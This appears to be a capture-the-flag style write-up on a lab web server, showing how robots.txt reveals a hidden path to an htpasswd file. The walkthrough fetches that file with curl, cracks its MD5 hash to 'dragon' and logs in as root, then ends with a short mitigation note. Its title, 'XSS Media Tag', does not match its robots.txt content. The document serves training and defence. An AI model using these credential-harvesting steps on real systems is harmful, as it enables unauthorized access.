# XSS Media Tag

A robots.txt file specifies which parts of a website are accessible to a web crawler. They are not a security mechanism but a way for search engines to index your website.

## Table of Contents

- [Steps](#Steps)
- [Vulnerabilities](#Vulnerabilities)
- [Ways to secure](#Ways to secure)

### Steps
* Open terminal
* Run
```bash
	curl http://192.168.0.108/robots.txt
        
	curl http://192.168.0.108/whatever/htpasswd #Displays "root:8621ffdbc5698829397d97767ac13db3"
```
* <a href="https://hashes.com/en/decrypt/hash">MD5 decrypt</a> the value we found
	8621ffdbc5698829397d97767ac13db3 -> dragon

* Sign in admin using the credentials
	root      [username]
	dragon    [password]

#### Vulnerabilities
An attacker can use a robot.txt file to navigate your website and see sections of your server.

##### Ways to secure
It's best not to declare private directories in robots.txt file since most crawlers will ignore the file and scan the entire directory.
